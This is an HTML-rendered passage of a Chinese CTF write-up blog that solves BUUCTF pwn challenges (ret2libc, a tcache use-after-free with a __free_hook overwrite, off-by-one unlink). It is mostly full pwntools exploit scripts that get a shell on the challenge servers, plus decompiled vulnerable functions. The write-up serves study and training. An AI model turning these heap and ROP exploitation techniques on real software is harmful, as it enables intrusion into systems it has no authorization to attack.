number">0x4f2c5</span><span class="token punctuation">,</span> <span class="token number">0x4f322</span><span class="token punctuation">,</span> <span class="token number">0x10a38c</span><span class="token punctuation">]</span>ogg <span class="token operator">=</span> one<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_base<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">0x88</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x88</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x88</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>ogg<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ogg<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x88</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>ogg<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ogg<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="axb-2019-brop64"><a href="#axb-2019-brop64" class="headerlink" title="axb_2019_brop64"></a><a href="https://buuoj.cn/challenges#axb_2019_brop64">axb_2019_brop64</a></h2><p>没什么好说的就是一个单纯的<code>ret2libc</code>，exp如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">28900</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000400963</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>main <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0xd8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Please tell me:'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.23/lib/x86_64-linux-gnu/libc-2.23.so'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45216</span><span class="token punctuation">,</span> <span class="token number">0x4526a</span><span class="token punctuation">,</span> <span class="token number">0xf02a4</span><span class="token punctuation">,</span> <span class="token number">0xf1147</span><span class="token punctuation">]</span>ogg <span class="token operator">=</span> one<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basep <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0xd8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ogg<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Please tell me:'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ciscn-2019-final-3"><a href="#ciscn-2019-final-3" class="headerlink" title="ciscn_2019_final_3"></a><a href="https://buuoj.cn/challenges#ciscn_2019_final_3">ciscn_2019_final_3</a></h2><p>检查保护，保护全开</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ciscn_2019_final_3  checksec pwn<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/starrysky/buuctf/ciscn_2019_final_3/pwn'</span>    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看程序是一个堆题，只有添加和删除，但是向堆内添加的时候会给出堆地址。<code>2.27</code>的<code>libc</code>中存在<code>tcache</code>，删除函数中存在<code>UAF</code>漏洞</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">unsigned __int64 add()&#123;  ...  v0 &#x3D; std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;input the index&quot;);  std::ostream::operator&lt;&lt;(v0, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  std::istream::operator&gt;&gt;(&amp;std::cin, &amp;index);  if ( ptr[index] || index &gt; 24 )    exit(0);  v1 &#x3D; std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;input the size&quot;);  std::ostream::operator&lt;&lt;(v1, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  std::istream::operator&gt;&gt;(&amp;std::cin, &amp;size);  if ( size &lt;&#x3D; 0x78 )  &#123;    v2 &#x3D; index;    ptr[v2] &#x3D; malloc(size);    v3 &#x3D; std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;now you can write something&quot;);    std::ostream::operator&lt;&lt;(v3, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    sub_CBB(ptr[index], size);    puts(&quot;OK!&quot;);    printf(&quot;gift :%p\n&quot;, ptr[index]);  &#125;  return __readfsqword(0x28u) ^ v7;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">unsigned __int64 delete()&#123;  __int64 v0; &#x2F;&#x2F; rax  unsigned int index; &#x2F;&#x2F; [rsp+4h] [rbp-Ch] BYREF  unsigned __int64 v3; &#x2F;&#x2F; [rsp+8h] [rbp-8h]  v3 &#x3D; __readfsqword(0x28u);  v0 &#x3D; std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, &quot;input the index&quot;);  std::ostream::operator&lt;&lt;(v0, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  std::istream::operator&gt;&gt;(&amp;std::cin, &amp;index);  if ( index &gt; 24 )    exit(0);  free(ptr[index]);  return __readfsqword(0x28u) ^ v3;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只给出了堆地址并且限制了堆大小必须小于<code>0x78</code>,第一步就是要泄露<code>libc</code>地址，方法就是通过<code>UAF</code>改堆的大小超过<code>0x400</code>，因为超过<code>0x400</code>的堆会直接进入<code>unsorted bin</code>，再把这个堆申请出来即可得到<code>libc</code>地址，再通过<code>tcache</code>改<code>__free_hook</code>为<code>ogg</code>，其中，可以通过多次释放增加<code>tcache</code>数组下标值绕过<code>tcache</code>检查</p><p>exp如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">28000</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice > '</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'input the index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'input the size'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'now you can write something'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice > '</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'input the index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x78</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span>heap_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x78</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>heap_addr <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>heap_addr <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0x481</span><span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span>heap_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    delete<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>heap_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3ec061</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.27/libc-2.27.so'</span><span class="token punctuation">)</span>free_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseone <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x4f2c5</span><span class="token punctuation">,</span> <span class="token number">0x4f322</span><span class="token punctuation">,</span> <span class="token number">0x10a38c</span><span class="token punctuation">]</span>ogg <span class="token operator">=</span> one<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseadd<span class="token punctuation">(</span><span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    delete<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>ogg<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="axb-2019-heap"><a href="#axb-2019-heap" class="headerlink" title="axb_2019_heap"></a><a href="https://buuoj.cn/challenges#axb_2019_heap">axb_2019_heap</a></h2><p><code>2.23</code>的<code>off-by-one + unlink</code></p><p><code>unlink</code>一开始没学好，一题看了几个小时（好痛苦</p><p>先检查保护</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">axb_2019_heap  checksec pwn<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/starrysky/buuctf/axb_2019_heap/pwn'</span>    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>程序中一开始有一个格式化字符串漏洞来泄露地址代替<code>show</code>函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">banner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> format<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-14h] BYREF</span>  <span class="token keyword">unsigned</span> __int64 v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-8h]</span>  v2 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Welcome to note management system!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Enter your name: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> format<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello, "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span>format<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\n-------------------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v2<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接着就是增删改，要求堆数量小于十个，并且存在堆管理</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.bss:0000000000202060 ??                            note db    ? ;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在<code>edit</code>中存在漏洞，可以实现一字节的溢出，并且<code>edit</code>是通过堆管理中的地址实现的</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">edit_note</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-Ch] BYREF</span>  <span class="token keyword">unsigned</span> __int64 v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-8h]</span>  v2 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Enter an index:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;=</span> <span class="token number">0xA</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>note <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v1<span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Enter the content: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">get_input</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>note <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>note <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Done!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You can't hack me!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v2<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来先讲讲<code>unlink</code>机制，在释放一个属于<code>unsorted bin</code>的堆时候会去判断它的上一个堆或下一个堆是否是释放状态，即<code>size</code>位的末尾是否是<code>0</code>，而判断上一个堆的位置是通过<code>prve_size</code>,即当前地址减去上一个堆的大小得到上一个堆的地址，这里是可以伪造的</p><p>在<code>unlink</code>操作中会存在一个检测机制，原理如下</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">unlink</span><span class="token expression"><span class="token punctuation">(</span>AV<span class="token punctuation">,</span> P<span class="token punctuation">,</span> BK<span class="token punctuation">,</span> FD<span class="token punctuation">)</span> <span class="token 